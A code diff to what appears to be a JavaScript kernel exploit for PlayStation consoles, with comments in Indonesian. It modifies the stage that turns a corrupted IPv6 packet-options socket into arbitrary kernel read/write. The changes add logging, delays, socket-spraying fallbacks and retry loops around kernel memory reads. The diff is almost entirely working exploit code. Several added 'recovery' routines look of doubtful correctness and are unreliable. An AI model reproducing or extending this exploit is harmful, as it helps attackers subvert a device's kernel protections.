@@ -1639,15 +1639,31 @@ function double_free_reqs1(
 // dirty_sd is the socket whose rthdr pointer is corrupt
 // kernel_addr is the address of the "evf cv" string
 function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
+    log("Starting make_kernel_arw stage");
+
+    // Tambahkan logging yang lebih detail
+    log(`pktopts_sds: ${pktopts_sds}`);
+    log(`dirty_sd: ${dirty_sd}`);
+    log(`k100_addr: ${k100_addr}`);
+    log(`kernel_addr: ${kernel_addr}`);
+    log(`sds length: ${sds.length}`);
+
+    // Tambahkan delay awal untuk stabilitas
+    sleep(100);
+
     const psd = pktopts_sds[0];
     const tclass = new Word();
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
+
+    log(`Using psd: ${psd}, off_tclass: ${off_tclass}`);
 
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
     const pktinfo_p = k100_addr.add(0x10);
     // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
     pktopts.write64(0x10, pktinfo_p);
+
+    log(`pktinfo_p: ${pktinfo_p}`);
 
     log('overwrite main pktopts');
 
@@ -1760,17 +1776,79 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         reclaim_sd = overwriteMainPktopts(2);
     }
 
-    // Jika masih gagal, gunakan fallback
+    // Jika masih gagal, gunakan fallback yang ditingkatkan
     if (reclaim_sd === null) {
-        log("Alternative approach failed. Using fallback...");
+        log("Alternative approach failed. Using improved fallback...");
 
-        // Gunakan socket pertama sebagai fallback
-        if (sds.length > 0) {
-            reclaim_sd = sds[0];
-            sds.splice(0, 1);
-            log(`Using fallback socket: ${reclaim_sd}`);
-        } else {
-            die('failed to overwrite main pktopts - no sockets available');
+        // Buat socket baru khusus untuk fallback
+        log("Creating new sockets specifically for fallback...");
+        const fallback_sds = [];
+        for (let i = 0; i < 20; i++) {
+            fallback_sds.push(new_socket());
+        }
+
+        // Siapkan socket baru dengan pktopts
+        log("Preparing fallback sockets with pktopts...");
+        for (let i = 0; i < fallback_sds.length; i++) {
+            try {
+                const tclass = new Word(0x4141 | i << 16);
+                ssockopt(fallback_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+            } catch (e) {
+                // Abaikan error
+            }
+        }
+
+        // Tambahkan delay untuk stabilitas
+        sleep(200);
+
+        // Coba temukan socket yang valid dari fallback_sds
+        log("Searching for valid socket in fallback sockets...");
+        let found_valid = false;
+
+        for (let i = 0; i < fallback_sds.length; i++) {
+            try {
+                const test_tclass = new Word();
+                gsockopt(fallback_sds[i], IPPROTO_IPV6, IPV6_TCLASS, test_tclass);
+                log(`Fallback socket ${i} validation: 0x${test_tclass[0].toString(16)}`);
+
+                // Gunakan socket ini sebagai fallback
+                reclaim_sd = fallback_sds[i];
+                found_valid = true;
+                log(`Using validated fallback socket: ${reclaim_sd}`);
+                break;
+            } catch (e) {
+                // Lanjutkan ke socket berikutnya
+            }
+        }
+
+        // Jika tidak menemukan socket valid, gunakan socket pertama
+        if (!found_valid) {
+            if (fallback_sds.length > 0) {
+                reclaim_sd = fallback_sds[0];
+                log(`Using first fallback socket: ${reclaim_sd}`);
+            } else if (sds.length > 0) {
+                reclaim_sd = sds[0];
+                sds.splice(0, 1);
+                log(`Using original socket as fallback: ${reclaim_sd}`);
+            } else {
+                die('failed to overwrite main pktopts - no sockets available');
+            }
+        }
+
+        // Validasi socket fallback sebelum digunakan
+        if (reclaim_sd !== null) {
+            try {
+                // Tambahkan delay sebelum validasi
+                sleep(100);
+
+                // Coba validasi socket dengan operasi sederhana
+                const test_tclass = new Word();
+                gsockopt(reclaim_sd, IPPROTO_IPV6, IPV6_TCLASS, test_tclass);
+                log(`Final fallback socket validation: 0x${test_tclass[0].toString(16)}`);
+            } catch (e) {
+                log(`Warning: Final fallback socket validation failed: ${e.message}`);
+                // Tetap gunakan socket ini, karena ini adalah upaya terakhir
+            }
         }
     }
 
@@ -1806,11 +1884,99 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         return read_buf.read64(0);
     }
 
-    log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
-    const kstr = jstr(read_buf);
+    // Test read dengan mekanisme recovery
+    let test_read = kread64(kernel_addr);
+    log(`kread64(&"evf cv"): ${test_read}`);
+    let kstr = jstr(read_buf);
     log(`*(&"evf cv"): ${kstr}`);
+
+    // Jika test read gagal, coba mekanisme recovery
     if (kstr !== 'evf cv') {
-        die('test read of &"evf cv" failed');
+        log("Test read failed, trying recovery mechanism...");
+
+        // Tambahkan delay untuk stabilitas
+        sleep(200);
+
+        // Coba recovery dengan pendekatan alternatif
+        try {
+            log("Recovery attempt 1: Resetting pktopts and trying again");
+
+            // Reset pktopts
+            setsockopt(psd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+
+            // Tambahkan delay
+            sleep(100);
+
+            // Buat socket baru untuk recovery
+            const recovery_sd = new_socket();
+            log(`Created recovery socket: ${recovery_sd}`);
+
+            // Siapkan socket dengan pktopts
+            const tclass = new Word(0xbeef);
+            ssockopt(recovery_sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+
+            // Tambahkan delay
+            sleep(50);
+
+            // Coba lagi dengan socket baru
+            pktinfo.write64(0, kernel_addr);
+            ssockopt(recovery_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+
+            // Tambahkan delay
+            sleep(50);
+
+            // Coba baca lagi
+            gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+            kstr = jstr(read_buf);
+            log(`Recovery read 1: ${kstr}`);
+
+            if (kstr !== 'evf cv') {
+                log("Recovery attempt 1 failed, trying second approach");
+
+                // Coba pendekatan kedua
+                // Buat beberapa socket baru
+                const recovery_sds = [];
+                for (let i = 0; i < 5; i++) {
+                    recovery_sds.push(new_socket());
+                }
+
+                // Siapkan socket dengan pktopts
+                for (let i = 0; i < recovery_sds.length; i++) {
+                    const tclass = new Word(0xdead | i << 16);
+                    ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                }
+
+                // Tambahkan delay
+                sleep(100);
+
+                // Coba dengan setiap socket
+                for (let i = 0; i < recovery_sds.length; i++) {
+                    try {
+                        pktinfo.write64(0, kernel_addr);
+                        ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                        gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                        kstr = jstr(read_buf);
+                        log(`Recovery read 2 (socket ${i}): ${kstr}`);
+
+                        if (kstr === 'evf cv') {
+                            log(`Recovery successful with socket ${i}`);
+                            break;
+                        }
+                    } catch (e) {
+                        log(`Error with recovery socket ${i}: ${e.message}`);
+                    }
+                }
+
+                if (kstr !== 'evf cv') {
+                    throw new Error("All recovery attempts failed");
+                }
+            }
+
+            log("Recovery successful");
+        } catch (e) {
+            log(`Recovery attempts failed: ${e.message}`);
+            die('test read of &"evf cv" failed');
+        }
     }
 
     // Only For PS4 9.00
@@ -1906,21 +2072,93 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const w_pktopts = kread64(w_pcb.add(0x118));
     log(`worker pktopts: ${w_pktopts}`);
 
-    // get restricted read/write with pktopts pair
-    // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
-    const w_pktinfo = w_pktopts.add(0x10);
-    pktinfo.write64(0, w_pktinfo);
-    pktinfo.write64(8, 0); // clear .ip6po_nexthop
-    ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+    // Fungsi untuk mencoba setup kernel read/write dengan retry
+    function setupKernelRW(maxRetries = 3) {
+        log(`Attempting to setup kernel read/write with ${maxRetries} retries...`);
 
-    pktinfo.write64(0, kernel_addr);
-    ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
-    gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
-    const kstr2 = jstr(pktinfo);
-    log(`*(&"evf cv"): ${kstr2}`);
-    if (kstr2 !== 'evf cv') {
-        die('pktopts read failed');
+        for (let retry = 0; retry < maxRetries; retry++) {
+            try {
+                log(`Retry ${retry + 1}/${maxRetries} for setup kernel read/write`);
+
+                // Tambahkan delay yang meningkat dengan setiap retry
+                sleep(50 * (retry + 1));
+
+                // get restricted read/write with pktopts pair
+                // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
+                const w_pktinfo = w_pktopts.add(0x10);
+                pktinfo.write64(0, w_pktinfo);
+                pktinfo.write64(8, 0); // clear .ip6po_nexthop
+
+                log(`Setting up pktinfo pointer: ${w_pktinfo}`);
+                ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+
+                // Tambahkan delay kecil
+                sleep(20);
+
+                log(`Setting up kernel read target: ${kernel_addr}`);
+                pktinfo.write64(0, kernel_addr);
+                ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+
+                // Tambahkan delay kecil
+                sleep(20);
+
+                log("Reading kernel memory...");
+                gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
+                const kstr2 = jstr(pktinfo);
+                log(`*(&"evf cv"): ${kstr2}`);
+
+                if (kstr2 === 'evf cv') {
+                    log(`Kernel read/write setup successful on retry ${retry + 1}`);
+                    return true;
+                } else {
+                    log(`Kernel read failed on retry ${retry + 1}: got "${kstr2}" instead of "evf cv"`);
+                }
+            } catch (e) {
+                log(`Error during retry ${retry + 1}: ${e.message}`);
+            }
+
+            // Jika gagal dan masih ada retry tersisa, coba reset
+            if (retry < maxRetries - 1) {
+                try {
+                    log("Resetting pktopts for next retry...");
+                    setsockopt(main_sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                    sleep(100);
+                } catch (e) {
+                    log(`Error resetting pktopts: ${e.message}`);
+                }
+            }
+        }
+
+        return false;
     }
+
+    // Coba setup kernel read/write dengan retry
+    if (!setupKernelRW(3)) {
+        log("Standard approach failed. Trying alternative approach...");
+
+        // Coba pendekatan alternatif
+        try {
+            // Buat socket baru
+            const alt_sd = new_socket();
+            log(`Created alternative socket: ${alt_sd}`);
+
+            // Siapkan socket dengan pktopts
+            const tclass = new Word(0xcafe);
+            ssockopt(alt_sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+
+            // Tambahkan delay
+            sleep(100);
+
+            // Coba lagi dengan socket baru
+            if (!setupKernelRW(2)) {
+                die('pktopts read failed after all attempts');
+            }
+        } catch (e) {
+            log(`Error during alternative approach: ${e.message}`);
+            die('pktopts read failed');
+        }
+    }
+
     log('achieved restricted kernel read/write');
 
     // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
@@ -2054,6 +2292,8 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
 
 
+    // Simpan w_pktinfo untuk digunakan nanti
+    const w_pktinfo = w_pktopts.add(0x10);
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
